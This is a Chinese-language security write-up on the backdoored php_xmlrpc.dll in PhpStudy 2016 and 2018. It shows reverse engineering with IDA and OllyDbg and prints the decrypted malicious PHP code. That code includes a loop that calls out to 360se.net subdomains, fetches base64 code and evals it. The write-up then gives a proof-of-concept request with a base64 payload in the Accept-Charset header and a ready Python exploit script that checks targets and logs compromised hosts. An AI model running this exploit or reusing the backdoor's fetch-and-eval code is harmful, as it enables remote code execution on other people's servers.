Phpstudy 后门（非官方后门！！！）
=================================

一、漏洞简介
------------

二、漏洞影响
------------

Phpstudy 2016

    php\php-5.2.17\ext\php_xmlrpc.dll
    php\php-5.4.45\ext\php_xmlrpc.dll

Phpstudy 2018 的php-5.2.17、php-5.4.45

    PHPTutorial\php\php-5.2.17\ext\php_xmlrpc.dll
    PHPTutorial\php\php-5.4.45\ext\php_xmlrpc.dll

三、复现过程
------------

分析过程
--------

-   1、定位特征字符串位置
-   2、静态分析传参数据
-   3、动态调试构造传参内容

### php\_xmlrpc.dll

PHPstudy
2018与2016两个版本的里的PHP5.2与PHP5.4版本里的恶意php\_xmlrpc.dll一致。

#### 定位特征字符串位置

根据\@eval()这个代码执行函数定位到引用位置。\@是PHP提供的错误信息屏蔽专用符号。Eval()可执行php代码，中间%s格式符为字符串传参。函数地址为：0x100031F0

![1.jpg](./.resource/Phpstudy后门(非官方后门！！！)/media/rId27.jpg)

图1：eval特征代码

#### 静态分析传参数据

通过F5查看代码，分析代码流程，判断条件是有全局变量且有HTTP\_ACCEPT\_ENCODING的时候进入内部语句。接下来有两个主要判断来做正向连接和反向连接的操作。主要有两个部分。

第一部分，正向连接：判断ACCEPT\_ENCODING如果等于gzip,deflate，读取ACCEPT\_CHARSE的内容做base64解密，交给zend\_eval\_strings()函数可以执行任意恶意代码。

构造HTTP头，把Accept-Encoding改成Accept-Encoding:
gzip,deflate可以触发第一个部分。

    GET /index.php HTTP/1.1
    Host: www.0-sec.org
    …..
    Accept-Encoding: gzip,deflate
    Accept-Charset:cHJpbnRmKG1kNSgzMzMpKTs=
    ….

第二部分，反向连接：判断ACCEPT\_ENCODING如果等于compress,gzip，通过关键部分\@eval(gzuncompress(\'%s\'));可以看到拼接了一段恶意代码，然后调用gzuncompress方法执行解密。

构造HTTP头，把Accept-Encoding改成Accept-Encoding:
compress,gzip可以触发第二部分。

    GET /index.php HTTP/1.1
    Host: www.0-sec.org
    …..
    Accept-Encoding:compress,gzip
    ….

![2.jpg](./.resource/Phpstudy后门(非官方后门！！！)/media/rId29.jpg)

图2：第1部分流程判断代码

![3.jpg](./.resource/Phpstudy后门(非官方后门！！！)/media/rId30.jpg)

图3：第2部分流程判断代码

这一部分有两处会执行zend\_eval\_strings函数代码的位置。分别是从1000D66C到1000E5C4的代码解密：

    @ini_set("display_errors","0");
    error_reporting(0);
    function tcpGet($sendMsg = '', $ip = '360se.net', $port = '20123'){
        $result = "";
      $handle = stream_socket_client("tcp://{$ip}:{$port}", $errno, $errstr,10); 
      if( !$handle ){
        $handle = fsockopen($ip, intval($port), $errno, $errstr, 5);
        if( !$handle ){
            return "err";
        }
      }
      fwrite($handle, $sendMsg."\n");
        while(!feof($handle)){
            stream_set_timeout($handle, 2);
            $result .= fread($handle, 1024);
            $info = stream_get_meta_data($handle);
            if ($info['timed_out']) {
              break;
            }
         }
      fclose($handle); 
      return $result; 
    }

    $ds = array("www","bbs","cms","down","up","file","ftp");
    $ps = array("20123","40125","8080","80","53");
    $n = false;
    do {
        $n = false;
        foreach ($ds as $d){
            $b = false;
            foreach ($ps as $p){
                $result = tcpGet($i,$d.".360se.net",$p); 
                if ($result != "err"){
                    $b =true;
                    break;
                }
            }
            if ($b)break;
        }
        $info = explode("<^>",$result);
        if (count($info)==4){
            if (strpos($info[3],"/*Onemore*/") !== false){
                $info[3] = str_replace("/*Onemore*/","",$info[3]);
                $n=true;
            }
            @eval(base64_decode($info[3]));
        }
    }while($n);

![4.jpg](./.resource/Phpstudy后门(非官方后门！！！)/media/rId31.jpg)

从1000D028 到1000D66C的代码解密：

    @ini_set("display_errors","0");
    error_reporting(0);
    $h = $_SERVER['HTTP_HOST'];
    $p = $_SERVER['SERVER_PORT'];
    $fp = fsockopen($h, $p, $errno, $errstr, 5);
    if (!$fp) {
    } else {
        $out = "GET {$_SERVER['SCRIPT_NAME']} HTTP/1.1\r\n";
        $out .= "Host: {$h}\r\n";
        $out .= "Accept-Encoding: compress,gzip\r\n";
        $out .= "Connection: Close\r\n\r\n";

        fwrite($fp, $out);
        fclose($fp);
    }

![5.jpg](./.resource/Phpstudy后门(非官方后门！！！)/media/rId32.jpg)

#### 动态调试构造传参内容

OD动态调试传参值需要对httpd.exe进程进行附加调试，phpstudy启用的httpd进程有两个。一个是带有参数的，一个是没有带参数的。在下断的时候选择没有参数的httpd.exe下断才能触发后门。

根据前面IDA静态分析得到的后门函数地址，OD附加进程后从httpd.exe调用的模块里找到php\_xmlrpc.dll模块，在DLL空间里定位后门函数地址0x100031F0，可能还需要手动修改偏移后下断点。使用burpsuite，构造Accept-Encoding的内容。发包后可以动态调试。建立触发点的虚拟机快照后可以反复跟踪调试得到最终可利用的payload。

![6.jpg](./.resource/Phpstudy后门(非官方后门！！！)/media/rId34.jpg)

图4：OD动态调试Payload

#### PHP脚本后门分析

脚本一功能：使用fsockopen模拟GET发包

    @ini_set("display_errors","0");
    error_reporting(0);
    $h = $_SERVER['HTTP_HOST'];
    $p = $_SERVER['SERVER_PORT'];
    $fp = fsockopen($h, $p, $errno, $errstr, 5);
    if (!$fp) {
    } else {
        $out = "GET {$_SERVER['SCRIPT_NAME']} HTTP/1.1\r\n";
        $out .= "Host: {$h}\r\n";
        $out .= "Accept-Encoding: compress,gzip\r\n";
        $out .= "Connection: Close\r\n\r\n";

        fwrite($fp, $out);
        fclose($fp);
    }

脚本二功能：内置有域名表和端口表，批量遍历然后发送数据。注释如下：

    <?php
    @ini_set("display_errors","0");
    error_reporting(0);
    function tcpGet($sendMsg = '', $ip = '360se.net', $port = '20123'){
        $result = "";
        $handle = stream_socket_client("tcp://{$ip}:{$port}", $errno, $errstr,10);  // 接收数据，每次过来一条数据就要连接一次
          if( !$handle ){
            $handle = fsockopen($ip, intval($port), $errno, $errstr, 5);  //错误的时候就重连一次测试。
            if( !$handle ){
                return "err";
            }
        }
        fwrite($handle, $sendMsg."\n");         // 模拟发送数据
        while(!feof($handle)){
            stream_set_timeout($handle, 2);
            $result .= fread($handle, 1024);   // 读取文件
            $info = stream_get_meta_data($handle);     // 超时则退出
            if ($info['timed_out']) {
                break;
            }
        }
        fclose($handle);
        return $result;
    }

    $ds = array("www","bbs","cms","down","up","file","ftp");   // 域名表
    $ps = array("20123","40125","8080","80","53");             // 端口表
    $n = false;
    do {
        $n = false;
        foreach ($ds as $d){                                   //遍历域名表
            $b = false;
            foreach ($ps as $p){                               // 遍历端口表
                $result = tcpGet($i,$d.".360se.net",$p);
                if ($result != "err"){
                    $b =true;
                    break;
                }
            }
            if ($b)break;
        }
        $info = explode("<^>",$result);
        if (count($info)==4){
            if (strpos($info[3],"/*Onemore*/") !== false){
                $info[3] = str_replace("/*Onemore*/","",$info[3]);
                $n=true;
            }
            @eval(base64_decode($info[3]));
        }
    }while($n);

    ?>

### POC

熟悉原理后可根据执行流程构造执行任意代码的Payload：

    GET /index.php HTTP/1.1
    Host: www.0-sec.org
    Cache-Control: max-age=0
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
    Accept-Encoding:gzip,deflate
    Accept-Charset:cHJpbnRmKG1kNSgzMzMpKTs=
    Content-Length: 0
    Accept-Language: zh-CN,zh;q=0.9
    Connection: close

Payload：`printf(md5(333));`

回显特征：`310dcbbf4cce62f762a2aaa148d556bd`

![7.jpg](./.resource/Phpstudy后门(非官方后门！！！)/media/rId37.jpg)

图5：Payload回显验证

### exp

    #!/usr/bin/env python3
    #-*- encoding:utf-8 -*-
    # 卿 博客:https://www.cnblogs.com/-qing-/

    import base64
    import requests
    import threading
    import queue


    print("======Phpstudy Backdoor Exploit============\n")
    print("===========By  Qing=================\n")
    print("=====Blog：https://www.cnblogs.com/-qing-/==\n")
    payload = "echo \"qing\";"
    payload = base64.b64encode(payload.encode('utf-8'))
    payload = str(payload, 'utf-8')
    headers = {
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'accept-charset': payload,
        'Accept-Encoding': 'gzip,deflate',
        'Connection': 'close',
    }



    def write_shell(url,headers):
        try:
            r = requests.get(url=url+'/index.php', headers=headers, verify=False,timeout=30)
            if "qing" in r.text:
                print ('[ + ] BackDoor successful: '+url+'===============[ + ]\n')
                with open('success.txt','a') as f:
                        f.write(url+'\n')
            else:
                print ('[ - ] BackDoor failed: '+url+'[ - ]\n')
        except:
            print ('[ - ] Timeout: '+url+' [ - ]\n')

    url = "http://xxx"
    write_shell(url=url,headers=headers)
